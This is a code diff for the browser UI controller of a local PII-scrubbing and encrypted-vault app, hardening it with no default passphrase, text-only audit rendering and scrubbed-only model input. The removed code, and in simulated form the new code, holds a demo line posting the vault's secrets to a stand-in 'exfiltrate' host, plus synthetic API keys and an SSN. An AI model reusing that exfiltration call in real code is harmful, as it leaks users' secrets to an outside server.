@@ -1,7 +1,18 @@
+
 /**
- * LocalVault AI v2.0 — Browser UI Controller (src/main.js)
- * Binds the 4-layer PII scrubber, AES-256-GCM cryptographic vault,
- * client-side network exfiltration firewall, 16kHz audio studio, and WebGPU worker bridge.
+ * LocalVault AI — Browser UI Controller
+ *
+ * Connects PII scrubbing, encrypted vault storage, network monitoring,
+ * audio utilities, note structuring and local inference.
+ *
+ * Security:
+ * - No default vault password.
+ * - The AI receives only the latest scrubbed text.
+ * - AI output is kept separate from the sanitized source.
+ * - Firewall audit entries are rendered as text, never HTML.
+ * - The exfiltration demo is simulated without sending a request.
+ *
+ * Note: First-time model/library downloads may require internet access.
  */
 
 import { PIIEngine, rehydrateText } from './pii-engine.js';
@@ -15,259 +26,804 @@ export function initLocalVaultApp() {
 
   const piiEngine = new PIIEngine();
   const cryptoVault = new CryptoVault();
-  const firewall = new NetworkFirewall().install(window);
 
-  let latestVaultMap = {};
-  let latestAudioSamples = null;
-  let worker = null;
+  const firewall = new NetworkFirewall();
+  let firewallInstallError = null;
 
   try {
-    worker = new Worker(new URL('./worker.js', import.meta.url), { type: 'module' });
-  } catch {
-    // Fallback if Worker initialization is restricted in headless preview
+    firewall.install(window);
+  } catch (error) {
+    firewallInstallError = error?.message || String(error);
   }
 
-  // Status badges
-  const webgpuBadge = document.getElementById('webgpu-badge');
-  const coiBadge = document.getElementById('coi-badge');
+  let latestVaultMap = {};
+  let latestScrubbedText = null;
+  let latestAudioSamples = null;
+  let worker = null;
+  let workerBusy = false;
+  let activeWorkerTask = null;
+  let activePrompt = '';
+
+  const getElement = (id) => document.getElementById(id);
+
+  function setStatus(element, message, state = 'warn') {
+    if (!element) return;
+
+    element.textContent = message;
+    element.className = `status-pill status-${state}`;
+  }
+
+  function showError(element, error) {
+    if (!element) return;
+
+    const message = error?.message || String(error || 'Unknown error');
+    element.value = `ERROR: ${message}`;
+  }
+
+  function setWorkerBusy(busy, task = null) {
+    workerBusy = Boolean(busy);
+    activeWorkerTask = workerBusy ? task : null;
+
+    const askButton = getElement('btn-ask-slm');
+    const abortButton = getElement('btn-abort-slm');
+    const transcribeButton = getElement('btn-transcribe');
+
+    if (askButton) askButton.disabled = workerBusy || !worker;
+    if (transcribeButton) transcribeButton.disabled = workerBusy || !worker;
+
+    if (abortButton) {
+      abortButton.disabled =
+        !workerBusy || activeWorkerTask !== 'generate';
+    }
+  }
+
+  function downloadBlob(blob, filename) {
+    if (!(blob instanceof Blob)) {
+      throw new Error('The requested download is not a valid file.');
+    }
+
+    const url = URL.createObjectURL(blob);
+    const anchor = document.createElement('a');
+
+    anchor.href = url;
+    anchor.download = filename;
+    anchor.style.display = 'none';
+
+    document.body.appendChild(anchor);
+    anchor.click();
+    anchor.remove();
+
+    window.setTimeout(() => URL.revokeObjectURL(url), 1500);
+  }
+
+  // ------------------------------------------------------------
+  // Separate output area for local AI responses.
+  // This keeps the sanitized source visible and unchanged.
+  // ------------------------------------------------------------
+
+  function createSlmOutput() {
+    const existing = getElement('slm-output');
+    if (existing) return existing;
+
+    const piiOutput = getElement('pii-output');
+    if (!piiOutput) return null;
+
+    const card = piiOutput.closest('.lv-card');
+    if (!card) return null;
+
+    const label = document.createElement('label');
+    label.htmlFor = 'slm-output';
+    label.textContent = 'Local AI Response';
+
+    const output = document.createElement('textarea');
+    output.id = 'slm-output';
+    output.className = 'lv-textarea mono';
+    output.rows = 7;
+    output.readOnly = true;
+    output.placeholder = 'Local model responses will appear here.';
+
+    const stats = getElement('pii-stats-bar');
+
+    if (stats && stats.parentElement === card) {
+      stats.insertAdjacentElement('afterend', label);
+      label.insertAdjacentElement('afterend', output);
+    } else {
+      card.append(label, output);
+    }
+
+    return output;
+  }
+
+  // ------------------------------------------------------------
+  // Runtime capability indicators
+  // ------------------------------------------------------------
+
+  const webgpuBadge = getElement('webgpu-badge');
+  const coiBadge = getElement('coi-badge');
 
   if (coiBadge) {
     const isolated = Boolean(window.crossOriginIsolated);
-    coiBadge.textContent = isolated ? 'COI: Isolated (SharedArrayBuffer OK)' : 'COI: Fallback Mode';
-    coiBadge.className = `status-pill ${isolated ? 'status-ok' : 'status-warn'}`;
+
+    setStatus(
+      coiBadge,
+      isolated ? 'COI: Isolated' : 'COI: Fallback Mode',
+      isolated ? 'ok' : 'warn'
+    );
   }
 
   if (webgpuBadge) {
-    if ('gpu' in navigator) {
-      navigator.gpu
-        .requestAdapter()
+    if (navigator.gpu?.requestAdapter) {
+      navigator.gpu.requestAdapter()
         .then((adapter) => {
-          webgpuBadge.textContent = adapter ? 'WebGPU: Hardware Accelerated' : 'WebGPU: WASM Fallback';
-          webgpuBadge.className = `status-pill ${adapter ? 'status-ok' : 'status-warn'}`;
+          setStatus(
+            webgpuBadge,
+            adapter ? 'WebGPU: Available' : 'WebGPU: WASM Fallback',
+            adapter ? 'ok' : 'warn'
+          );
         })
         .catch(() => {
-          webgpuBadge.textContent = 'WebGPU: WASM Fallback';
-          webgpuBadge.className = 'status-pill status-warn';
+          setStatus(webgpuBadge, 'WebGPU: WASM Fallback', 'warn');
         });
     } else {
-      webgpuBadge.textContent = 'WebGPU: WASM Fallback';
-      webgpuBadge.className = 'status-pill status-warn';
+      setStatus(webgpuBadge, 'WebGPU: WASM Fallback', 'warn');
     }
   }
 
-  // Tab switching
-  const tabs = document.querySelectorAll('.lv-tab');
-  const panels = document.querySelectorAll('.lv-panel');
-  tabs.forEach((tab) => {
-    tab.addEventListener('click', () => {
-      tabs.forEach((t) => {
-        t.classList.remove('active');
-        t.setAttribute('aria-selected', 'false');
-      });
-      panels.forEach((p) => p.classList.remove('active'));
-      tab.classList.add('active');
-      tab.setAttribute('aria-selected', 'true');
-      const target = document.getElementById(tab.dataset.tab);
-      if (target) target.classList.add('active');
-    });
-  });
+  // ------------------------------------------------------------
+  // Dedicated inference worker
+  // ------------------------------------------------------------
 
-  // Air-Gap Lockdown toggle
-  const airgapToggle = document.getElementById('airgap-toggle');
-  if (airgapToggle) {
-    airgapToggle.addEventListener('change', (e) => {
-      firewall.setAirGapLockdown(e.target.checked);
-      renderFirewallAudit();
+  try {
+    worker = new Worker(
+      new URL('./worker.js', import.meta.url),
+      { type: 'module' }
+    );
+  } catch (error) {
+    console.error('LocalVault worker initialization failed:', error);
+
+    setStatus(
+      webgpuBadge,
+      'Local worker unavailable',
+      'warn'
+    );
+  }
+
+  if (worker) {
+    worker.addEventListener('message', (event) => {
+      const data = event.data || {};
+
+      if (data.type === 'status') {
+        const message = data.message || 'Local model is loading.';
+
+        const stats = getElement('pii-stats-bar');
+        if (stats) stats.textContent = message;
+
+        return;
+      }
+
+      if (data.type === 'generation-complete') {
+        const output = getElement('slm-output') || createSlmOutput();
+
+        if (output) {
+          const generated = String(data.text || '');
+
+          output.value = generated.startsWith(activePrompt)
+            ? generated.slice(activePrompt.length).trim()
+            : generated;
+
+          if (!output.value) {
+            output.value = 'The model returned an empty response.';
+          }
+        }
+
+        const stats = getElement('pii-stats-bar');
+
+        if (stats) {
+          stats.textContent =
+            `Local inference complete · ${data.device || 'unknown device'} · ` +
+            `${data.model || 'unknown model'}`;
+        }
+
+        setWorkerBusy(false);
+        return;
+      }
+
+      if (data.type === 'transcription-complete') {
+        const transcript = getElement('transcript-input');
+
+        if (transcript) {
+          transcript.value = String(data.text || '');
+        }
+
+        const structured = getElement('structured-output');
+
+        if (structured) {
+          structured.value = data.text
+            ? 'Transcription completed. Review the transcript, then select Structure & Auto-Scrub Notes.'
+            : 'The model did not return a transcript.';
+        }
+
+        setWorkerBusy(false);
+        return;
+      }
+
+      if (data.type === 'aborted') {
+        const stats = getElement('pii-stats-bar');
+
+        if (stats) stats.textContent = 'Generation cancelled.';
+
+        setWorkerBusy(false);
+        return;
+      }
+
+      if (data.type === 'error') {
+        const message =
+          data.error || 'The local worker reported an error.';
+
+        const stats = getElement('pii-stats-bar');
+
+        if (stats) {
+          stats.textContent = `Worker error: ${message}`;
+        }
+
+        if (activeWorkerTask === 'generate') {
+          const output = getElement('slm-output');
+
+          if (output) {
+            output.value = `GENERATION ERROR: ${message}`;
+          }
+        }
+
+        if (activeWorkerTask === 'transcribe') {
+          const structured = getElement('structured-output');
+
+          if (structured) {
+            structured.value = `TRANSCRIPTION ERROR: ${message}`;
+          }
+        }
+
+        setWorkerBusy(false);
+      }
+    });
+
+    worker.addEventListener('error', (event) => {
+      const message =
+        event.message || 'The local worker stopped unexpectedly.';
+
+      const stats = getElement('pii-stats-bar');
+
+      if (stats) {
+        stats.textContent = `Worker error: ${message}`;
+      }
+
+      worker.terminate();
+      worker = null;
+
+      setWorkerBusy(false);
+      setStatus(webgpuBadge, 'Local worker unavailable', 'warn');
+    });
+
+    worker.addEventListener('messageerror', () => {
+      const stats = getElement('pii-stats-bar');
+
+      if (stats) {
+        stats.textContent = 'Worker message could not be decoded.';
+      }
+
+      setWorkerBusy(false);
     });
   }
 
-  // Tab 1: PII Scrubber controls
-  const piiInput = document.getElementById('pii-input');
-  const piiOutput = document.getElementById('pii-output');
-  const piiStatsBar = document.getElementById('pii-stats-bar');
-  const customBlockInput = document.getElementById('custom-block-input');
+  setWorkerBusy(false);
 
-  document.getElementById('btn-load-sample')?.addEventListener('click', () => {
+  // ------------------------------------------------------------
+  // Tab navigation
+  // ------------------------------------------------------------
+
+  const tabs = document.querySelectorAll('.lv-tab');
+  const panels = document.querySelectorAll('.lv-panel');
+
+  tabs.forEach((tab) => {
+    tab.addEventListener('click', () => {
+      tabs.forEach((item) => {
+        item.classList.remove('active');
+        item.setAttribute('aria-selected', 'false');
+      });
+
+      panels.forEach((panel) => panel.classList.remove('active'));
+
+      tab.classList.add('active');
+      tab.setAttribute('aria-selected', 'true');
+
+      const target = getElement(tab.dataset.tab);
+
+      if (target) {
+        target.classList.add('active');
+      }
+    });
+  });
+
+  // ------------------------------------------------------------
+  // Tab 1: PII and secret scrubber
+  // ------------------------------------------------------------
+
+  const piiInput = getElement('pii-input');
+  const piiOutput = getElement('pii-output');
+  const piiStatsBar = getElement('pii-stats-bar');
+  const customBlockInput = getElement('custom-block-input');
+
+  getElement('btn-load-sample')?.addEventListener('click', () => {
     if (!piiInput) return;
+
     piiInput.value = [
-      '# Production Incident Config Dump',
-      'DATABASE_URL=postgres://admin:Sup3rS3cr3tP@ssw0rd99@198.51.100.42:5432/prod_vault',
+      '# Synthetic LocalVault security test data',
+      'DATABASE_URL=postgres://demo:FakePassword123!@198.51.100.42:5432/demo_db',
       'OPENAI_API_KEY=sk-proj-9a8b7c6d5e4f3g2h1i0j9k8l7m6n5o4p3q2r1s',
       'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE',
       'LOCAL_DEV_HOST=127.0.0.1',
-      'Customer Jane Doe (email: jane.doe@acme-corp.io, SSN: 123-45-6789) reported card 4532-0151-1283-0366 failed.'
+      'Customer Jane Doe (email: jane.doe@example.org, SSN: 123-45-6789) reported card 4532-0151-1283-0366 failed.'
     ].join('\n');
-  });
 
-  document.getElementById('btn-add-block')?.addEventListener('click', () => {
-    if (customBlockInput && customBlockInput.value.trim()) {
-      piiEngine.addBlocklistTerm(customBlockInput.value.trim());
-      customBlockInput.value = '';
-    }
-  });
+    latestScrubbedText = null;
+    latestVaultMap = {};
 
-  document.getElementById('btn-scrub')?.addEventListener('click', () => {
-    if (!piiInput || !piiOutput) return;
-    const res = piiEngine.scrub(piiInput.value);
-    latestVaultMap = res.vaultMap;
-    piiOutput.value = res.scrubbedText;
+    if (piiOutput) piiOutput.value = '';
+
+    const slmOutput = getElement('slm-output');
+    if (slmOutput) slmOutput.value = '';
+
     if (piiStatsBar) {
-      const L = res.stats.byLayer;
-      piiStatsBar.textContent = `Total Redacted: ${res.stats.totalRedacted} | Layer 1: ${L[1]} | Layer 2 (Entropy/AST): ${L[2]} | Layer 3: ${L[3]} | Layer 4 (NER): ${L[4]}`;
+      piiStatsBar.textContent =
+        'Sample loaded. Select Scrub 4 Layers before using the AI model.';
     }
   });
 
-  document.getElementById('btn-rehydrate')?.addEventListener('click', () => {
+  getElement('btn-add-block')?.addEventListener('click', () => {
+    if (!customBlockInput) return;
+
+    const term = customBlockInput.value.trim();
+
+    if (!term) return;
+
+    piiEngine.addBlocklistTerm(term);
+    customBlockInput.value = '';
+
+    if (piiStatsBar) {
+      piiStatsBar.textContent = 'Custom blocklist term added.';
+    }
+  });
+
+  getElement('btn-scrub')?.addEventListener('click', () => {
+    if (!piiInput || !piiOutput) return;
+
+    try {
+      const result = piiEngine.scrub(piiInput.value);
+
+      latestVaultMap = { ...result.vaultMap };
+      latestScrubbedText = result.scrubbedText;
+
+      piiOutput.value = result.scrubbedText;
+
+      const slmOutput = getElement('slm-output');
+
+      if (slmOutput) {
+        slmOutput.value = '';
+      }
+
+      if (piiStatsBar) {
+        const layers = result.stats.byLayer;
+
+        piiStatsBar.textContent =
+          `Total Redacted: ${result.stats.totalRedacted} | ` +
+          `Layer 1: ${layers[1]} | ` +
+          `Layer 2: ${layers[2]} | ` +
+          `Layer 3: ${layers[3]} | ` +
+          `Layer 4 heuristic: ${layers[4]}`;
+      }
+    } catch (error) {
+      showError(piiOutput, error);
+    }
+  });
+
+  getElement('btn-rehydrate')?.addEventListener('click', () => {
     if (!piiOutput) return;
-    piiOutput.value = rehydrateText(piiOutput.value, latestVaultMap);
-  });
 
-  // WebGPU Worker SLM & Abort
-  const btnAskSlm = document.getElementById('btn-ask-slm');
-  const btnAbortSlm = document.getElementById('btn-abort-slm');
-
-  btnAskSlm?.addEventListener('click', () => {
-    if (!worker || !piiOutput) return;
-    btnAbortSlm.disabled = false;
-    worker.postMessage({
-      type: 'generate',
-      payload: {
-        prompt: `Summarize safely:\n${piiOutput.value}`
-      }
-    });
-  });
-
-  btnAbortSlm?.addEventListener('click', () => {
-    if (!worker) return;
-    worker.postMessage({ type: 'abort' });
-    btnAbortSlm.disabled = true;
-  });
-
-  if (worker) {
-    worker.addEventListener('message', (e) => {
-      const data = e.data || {};
-      if (data.type === 'generation-complete' && piiOutput) {
-        piiOutput.value = data.text;
-        if (btnAbortSlm) btnAbortSlm.disabled = true;
-      } else if (data.type === 'transcription-complete') {
-        const tInput = document.getElementById('transcript-input');
-        if (tInput) tInput.value = data.text;
-      }
-    });
-  }
-
-  // Tab 2: Audio & Note Structurer
-  const transcriptInput = document.getElementById('transcript-input');
-  const structuredOutput = document.getElementById('structured-output');
-  const noteModeSelect = document.getElementById('note-mode-select');
-
-  document.getElementById('btn-synth-wav')?.addEventListener('click', () => {
-    const synth = synthesizeTestWav({ durationSeconds: 1.5, sampleRate: 16000 });
-    latestAudioSamples = synth.samples;
-    exportWavBlob(synth.samples, synth.sampleRate);
-    if (transcriptInput && !transcriptInput.value.trim()) {
-      transcriptInput.value =
-        'SRE Incident Call: Database primary at 198.51.100.77 experienced latency spike. Engineer Sarah Connor rotated secret API_KEY=sk-proj-1234567890abcdefghijklmnop and restored localhost health checks. Todo: audit connection pooling by Friday.';
+    try {
+      piiOutput.value = rehydrateText(
+        piiOutput.value,
+        latestVaultMap
+      );
+    } catch (error) {
+      showError(piiOutput, error);
     }
   });
 
-  document.getElementById('btn-transcribe')?.addEventListener('click', () => {
-    if (!latestAudioSamples) {
-      const synth = synthesizeTestWav({ durationSeconds: 1.0, sampleRate: 16000 });
+  // ------------------------------------------------------------
+  // Tab 1: Local SLM generation
+  // ------------------------------------------------------------
+
+  getElement('btn-ask-slm')?.addEventListener('click', () => {
+    if (!worker) {
+      if (piiStatsBar) {
+        piiStatsBar.textContent =
+          'Local AI worker is unavailable in this browser session.';
+      }
+
+      return;
+    }
+
+    if (workerBusy) return;
+
+    if (
+      typeof latestScrubbedText !== 'string' ||
+      !latestScrubbedText.trim()
+    ) {
+      if (piiStatsBar) {
+        piiStatsBar.textContent =
+          'Scrub your input first. The model only receives the latest scrubbed text.';
+      }
+
+      return;
+    }
+
+    activePrompt =
+      'Summarize the following sanitized developer content. ' +
+      'Do not invent missing facts or credentials.\n\n' +
+      latestScrubbedText;
+
+    try {
+      setWorkerBusy(true, 'generate');
+
+      worker.postMessage({
+        type: 'generate',
+        payload: {
+          prompt: activePrompt,
+          maxNewTokens: 192
+        }
+      });
+
+      if (piiStatsBar) {
+        piiStatsBar.textContent =
+          'Preparing local model inference. First-time model downloads may require internet access.';
+      }
+    } catch (error) {
+      setWorkerBusy(false);
+
+      if (piiStatsBar) {
+        piiStatsBar.textContent =
+          `Could not start generation: ${error.message}`;
+      }
+    }
+  });
+
+  getElement('btn-abort-slm')?.addEventListener('click', () => {
+    if (
+      !worker ||
+      !workerBusy ||
+      activeWorkerTask !== 'generate'
+    ) {
+      return;
+    }
+
+    try {
+      worker.postMessage({ type: 'abort' });
+    } catch (error) {
+      if (piiStatsBar) {
+        piiStatsBar.textContent =
+          `Could not abort generation: ${error.message}`;
+      }
+
+      setWorkerBusy(false);
+    }
+  });
+
+  // ------------------------------------------------------------
+  // Tab 2: Audio test utilities and note structuring
+  // ------------------------------------------------------------
+
+  const transcriptInput = getElement('transcript-input');
+  const structuredOutput = getElement('structured-output');
+  const noteModeSelect = getElement('note-mode-select');
+
+  getElement('btn-synth-wav')?.addEventListener('click', () => {
+    try {
+      const synth = synthesizeTestWav({
+        durationSeconds: 1.5,
+        sampleRate: 16000
+      });
+
       latestAudioSamples = synth.samples;
+
+      const wavBlob = exportWavBlob(
+        synth.samples,
+        synth.sampleRate
+      );
+
+      downloadBlob(
+        wavBlob,
+        `localvault-test-${Date.now()}.wav`
+      );
+
+      if (structuredOutput) {
+        structuredOutput.value =
+          'A synthetic test-tone WAV was generated and downloaded. ' +
+          'It is not recorded speech. Real microphone and file-audio input are not connected yet.';
+      }
+    } catch (error) {
+      showError(structuredOutput, error);
     }
-    if (worker) {
+  });
+
+  getElement('btn-transcribe')?.addEventListener('click', () => {
+    if (!worker) {
+      if (structuredOutput) {
+        structuredOutput.value =
+          'The local AI worker is unavailable.';
+      }
+
+      return;
+    }
+
+    if (workerBusy) return;
+
+    if (!latestAudioSamples) {
+      if (structuredOutput) {
+        structuredOutput.value =
+          'Generate the test WAV first. Real microphone and file-audio input are not implemented yet.';
+      }
+
+      return;
+    }
+
+    try {
+      setWorkerBusy(true, 'transcribe');
+
       worker.postMessage({
         type: 'transcribe',
-        payload: { audio: latestAudioSamples }
+        payload: {
+          audio: latestAudioSamples
+        }
       });
+
+      if (structuredOutput) {
+        structuredOutput.value =
+          'Transcribing the generated test tone. A test tone is not natural speech, so the result may not be meaningful.';
+      }
+    } catch (error) {
+      setWorkerBusy(false);
+      showError(structuredOutput, error);
     }
   });
 
-  document.getElementById('btn-structure-notes')?.addEventListener('click', () => {
+  getElement('btn-structure-notes')?.addEventListener('click', () => {
     if (!transcriptInput || !structuredOutput) return;
-    const mode = noteModeSelect ? noteModeSelect.value : 'meeting';
-    const result = structureTranscript(transcriptInput.value, {
-      mode,
-      autoScrub: true,
-      piiEngine
-    });
-    Object.assign(latestVaultMap, result.vaultMap);
-    structuredOutput.value = result.markdown;
-  });
 
-  // Tab 3: AES-256-GCM Zero-Knowledge Vault
-  const vaultPassphrase = document.getElementById('vault-passphrase');
-  const vaultCiphertext = document.getElementById('vault-ciphertext');
-  const vaultPlaintext = document.getElementById('vault-plaintext');
+    if (!transcriptInput.value.trim()) {
+      structuredOutput.value =
+        'Enter a transcript or notes before structuring.';
 
-  document.getElementById('btn-lock-vault')?.addEventListener('click', async () => {
-    if (!vaultPassphrase || !vaultCiphertext) return;
-    const pass = vaultPassphrase.value || 'localvault-default-passphrase';
-    const envelope = await cryptoVault.lock(latestVaultMap, pass);
-    vaultCiphertext.value = cryptoVault.exportLvVault(envelope);
-    if (vaultPlaintext) vaultPlaintext.value = '[VAULT LOCKED — AES-256-GCM AUTHENTICATED]';
-  });
+      return;
+    }
 
-  document.getElementById('btn-unlock-vault')?.addEventListener('click', async () => {
-    if (!vaultPassphrase || !vaultCiphertext || !vaultPlaintext) return;
     try {
-      const pass = vaultPassphrase.value || 'localvault-default-passphrase';
-      const unlocked = await cryptoVault.unlock(vaultCiphertext.value, pass);
-      vaultPlaintext.value = JSON.stringify(unlocked, null, 2);
-    } catch (err) {
-      vaultPlaintext.value = `ERROR: ${err.message}`;
+      const mode = noteModeSelect?.value || 'meeting';
+
+      const result = structureTranscript(
+        transcriptInput.value,
+        {
+          mode,
+          autoScrub: true,
+          piiEngine
+        }
+      );
+
+      latestVaultMap = {
+        ...latestVaultMap,
+        ...result.vaultMap
+      };
+
+      structuredOutput.value = result.markdown;
+    } catch (error) {
+      showError(structuredOutput, error);
     }
   });
 
-  document.getElementById('btn-export-vault')?.addEventListener('click', () => {
-    if (!vaultCiphertext || !vaultCiphertext.value.trim()) return;
-    const blob = new Blob([vaultCiphertext.value], { type: 'application/json' });
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = `localvault-${Date.now()}.lvvault`;
-    a.click();
-    URL.revokeObjectURL(url);
+  // ------------------------------------------------------------
+  // Tab 3: Encrypted vault
+  // ------------------------------------------------------------
+
+  const vaultPassphrase = getElement('vault-passphrase');
+  const vaultCiphertext = getElement('vault-ciphertext');
+  const vaultPlaintext = getElement('vault-plaintext');
+
+  getElement('btn-lock-vault')?.addEventListener('click', async () => {
+    if (!vaultPassphrase || !vaultCiphertext || !vaultPlaintext) return;
+
+    const passphrase = vaultPassphrase.value;
+
+    if (!passphrase.trim()) {
+      vaultPlaintext.value = 'ERROR: Enter a master passphrase.';
+      vaultPassphrase.focus();
+      return;
+    }
+
+    if (passphrase.length < 12) {
+      vaultPlaintext.value =
+        'ERROR: Use a passphrase with at least 12 characters.';
+
+      vaultPassphrase.focus();
+      return;
+    }
+
+    if (Object.keys(latestVaultMap).length === 0) {
+      vaultPlaintext.value =
+        'ERROR: No redacted data is available. Scrub input or structure notes first.';
+
+      return;
+    }
+
+    try {
+      const envelope = await cryptoVault.lock(
+        latestVaultMap,
+        passphrase
+      );
+
+      vaultCiphertext.value =
+        cryptoVault.exportLvVault(envelope);
+
+      vaultPlaintext.value =
+        '[VAULT LOCKED — AES-256-GCM AUTHENTICATED]';
+    } catch (error) {
+      showError(vaultPlaintext, error);
+    }
   });
 
-  // Tab 4: Network Firewall Audit Log
-  const firewallStats = document.getElementById('firewall-stats');
-  const firewallLog = document.getElementById('firewall-log');
+  getElement('btn-unlock-vault')?.addEventListener('click', async () => {
+    if (!vaultPassphrase || !vaultCiphertext || !vaultPlaintext) return;
+
+    const passphrase = vaultPassphrase.value;
+
+    if (!passphrase.trim()) {
+      vaultPlaintext.value = 'ERROR: Enter the vault passphrase.';
+      vaultPassphrase.focus();
+      return;
+    }
+
+    if (!vaultCiphertext.value.trim()) {
+      vaultPlaintext.value =
+        'ERROR: Paste or import an encrypted vault file first.';
+
+      return;
+    }
+
+    try {
+      const unlocked = await cryptoVault.unlock(
+        vaultCiphertext.value,
+        passphrase
+      );
+
+      vaultPlaintext.value = JSON.stringify(
+        unlocked,
+        null,
+        2
+      );
+    } catch (error) {
+      showError(vaultPlaintext, error);
+    }
+  });
+
+  getElement('btn-export-vault')?.addEventListener('click', () => {
+    if (!vaultCiphertext || !vaultCiphertext.value.trim()) {
+      if (vaultPlaintext) {
+        vaultPlaintext.value =
+          'ERROR: There is no encrypted vault to export.';
+      }
+
+      return;
+    }
+
+    try {
+      const blob = new Blob(
+        [vaultCiphertext.value],
+        { type: 'application/json' }
+      );
+
+      downloadBlob(
+        blob,
+        `localvault-${Date.now()}.lvvault`
+      );
+    } catch (error) {
+      showError(vaultPlaintext, error);
+    }
+  });
+
+  // ------------------------------------------------------------
+  // Tab 4: Network activity monitor
+  // ------------------------------------------------------------
+
+  const firewallStats = getElement('firewall-stats');
+  const firewallLog = getElement('firewall-log');
 
   function renderFirewallAudit() {
     if (!firewallStats || !firewallLog) return;
+
     const stats = firewall.getStats();
-    firewallStats.textContent = `Intercepted Requests: ${stats.totalEvents} | Allowed Read-Only: ${stats.allowed} | Blocked Exfiltration Attempts: ${stats.blocked}`;
-    firewallLog.innerHTML = firewall.auditLog
-      .map(
-        (ev) =>
-          `<div>[${ev.timestamp}] <strong>${ev.action}</strong> (${ev.method} ${ev.url}) — ${ev.reason}</div>`
-      )
-      .join('');
+
+    firewallStats.textContent =
+      `Recorded Events: ${stats.totalEvents} | ` +
+      `Allowed Read-Only: ${stats.allowed} | ` +
+      `Blocked Events: ${stats.blocked}`;
+
+    // Safe rendering: never insert audit values as HTML.
+    const fragment = document.createDocumentFragment();
+
+    for (const event of firewall.auditLog) {
+      const row = document.createElement('div');
+      const timestamp = document.createElement('span');
+      const action = document.createElement('strong');
+      const details = document.createElement('span');
+
+      timestamp.textContent =
+        `[${String(event.timestamp || '')}] `;
+
+      action.textContent =
+        String(event.action || 'EVENT');
+
+      details.textContent =
+        ` (${String(event.method || '')} ${String(event.url || '')}) — ` +
+        String(event.reason || '');
+
+      row.append(timestamp, action, details);
+      fragment.appendChild(row);
+    }
+
+    firewallLog.replaceChildren(fragment);
   }
 
   firewall.onAuditEvent(() => renderFirewallAudit());
 
-  document.getElementById('btn-test-exfil')?.addEventListener('click', async () => {
-    try {
-      await window.fetch('https://telemetry-collector.example.org/exfiltrate', {
-        method: 'POST',
-        body: JSON.stringify({ leakedSecrets: latestVaultMap })
-      });
-    } catch {
-      // Expected block by LocalVault NetworkFirewall
-    }
+  if (firewallInstallError && firewallStats) {
+    firewallStats.textContent =
+      `Request monitor could not install: ${firewallInstallError}`;
+  }
+
+  getElement('airgap-toggle')?.addEventListener('change', (event) => {
+    firewall.setAirGapLockdown(
+      Boolean(event.target.checked)
+    );
+
+    renderFirewallAudit();
+  });
+
+  getElement('btn-test-exfil')?.addEventListener('click', () => {
+    // Local policy simulation only. No outbound request is sent.
+    firewall.inspectRequest(
+      'https://telemetry-collector.example.org/exfiltrate',
+      'POST',
+      JSON.stringify({ simulation: true })
+    );
+
     renderFirewallAudit();
   });
 
   renderFirewallAudit();
-  return { piiEngine, cryptoVault, firewall };
+
+  return {
+    piiEngine,
+    cryptoVault,
+    firewall,
+    getLatestScrubbedText: () => latestScrubbedText,
+    getLatestVaultMap: () => ({ ...latestVaultMap })
+  };
 }
 
 if (typeof document !== 'undefined') {
   if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', () => initLocalVaultApp());
+    document.addEventListener(
+      'DOMContentLoaded',
+      () => initLocalVaultApp(),
+      { once: true }
+    );
   } else {
     initLocalVaultApp();
   }
